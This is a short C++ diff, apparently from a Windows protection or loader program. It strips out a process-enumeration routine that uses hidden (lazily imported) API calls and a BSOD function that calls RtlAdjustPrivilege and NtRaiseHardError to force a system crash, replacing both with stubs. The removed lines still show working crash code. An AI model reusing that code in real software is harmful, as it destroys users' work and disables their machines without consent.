@@ -66,28 +66,7 @@ std::string RandomVolumeID(const int len)
 
 std::uintptr_t ProcessFinder(const std::string& name)
 {
-	const auto snap = LI_FN(CreateToolhelp32Snapshot).safe()(TH32CS_SNAPPROCESS, 0);
-	if (snap == INVALID_HANDLE_VALUE) {
-		return 0;
-	}
-
-	PROCESSENTRY32 proc_entry{};
-	proc_entry.dwSize = sizeof proc_entry;
-
-	auto found_process = false;
-	if (!!LI_FN(Process32First).safe()(snap, &proc_entry)) {
-		do {
-			if (name == proc_entry.szExeFile) {
-				found_process = true;
-				break;
-			}
-		} while (!!LI_FN(Process32Next).safe()(snap, &proc_entry));
-	}
-
-	LI_FN(CloseHandle).safe()(snap);
-	return found_process
-		? proc_entry.th32ProcessID
-		: 0;
+    return false;
 }
 
 void NameChanger()
@@ -106,14 +85,7 @@ DWORD ChangeName(LPVOID in)
 
 bool BSOD()
 {
-	BOOLEAN bEnabled;
-	ULONG uResp;
-	LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
-	LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
-	pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
-	pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
-	NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
-	NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
+	exit(10);
 	return 0;
 }
 
